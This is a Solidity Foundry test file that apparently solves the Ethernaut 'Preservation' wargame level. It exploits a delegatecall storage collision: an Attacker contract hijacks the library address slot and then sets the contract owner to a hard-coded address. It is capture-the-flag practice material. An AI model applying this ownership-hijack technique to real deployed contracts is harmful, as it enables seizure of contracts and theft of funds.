// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Preservation, LibraryContract} from "../src/Preservation.sol";

contract Attacker {
    address preservation;
    address lib1 = address(0);
    address lib2 = address(0);
    address private constant Alice = 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea;

    constructor(address _preservationAddress) {
        preservation = _preservationAddress;
    }

    function setTime(uint256 _time) public {
        lib2 = Alice;
    }
}

contract PreservationTest is Test {
    Preservation preservation;
    LibraryContract lib1;
    LibraryContract lib2;
    Attacker attacker;

    address private constant Alice = 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea;

    function setUp() public {
        attacker = new Attacker(address(preservation));

        lib1 = new LibraryContract();
        lib2 = new LibraryContract();
        preservation = new Preservation(address(lib1), address(lib2));
    }

    function testPreservation() public {
        // preservation.timeZone1Library();
        // preservation.timeZone2Library();
        // preservation.owner();

        bytes memory data = abi.encodeWithSignature("setFirstTime(uint256)", address(attacker));
        (bool success,) = address(preservation).call(data);
        assertEq(success, true, "Failed to call setFirstTime");

        preservation.setFirstTime(block.timestamp);
        assertEq(preservation.owner(), Alice, "Failed to set owner");
    }
}
